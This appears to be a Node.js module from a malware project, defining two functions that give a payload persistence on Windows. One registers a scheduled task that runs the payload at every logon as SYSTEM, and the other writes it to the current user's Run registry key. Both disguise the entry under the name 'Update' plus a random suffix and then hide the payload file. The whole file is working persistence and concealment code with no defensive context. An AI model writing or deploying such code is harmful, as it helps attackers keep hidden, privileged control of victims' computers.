const childprocess = require('child_process');
const path = require('path');
const core = require('./core');
const fs = require('fs');

function addServicePersistence(persistencePath, random) {
    childprocess.execSync(`schtasks /create /tn Update${random} /tr "${persistencePath}" /sc onlogon /ru System`);
    core.hideFile(persistencePath);
}

function addRegistryPersistence(persistencePath, random) {
    childprocess.execSync(`powershell -Command "New-ItemProperty -Path \\"Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" -Name \\"Update${random}\\" -Value \\"${persistencePath}\\""`);
    core.hideFile(persistencePath);
}

module.exports = {
    addServicePersistence,
    addRegistryPersistence
}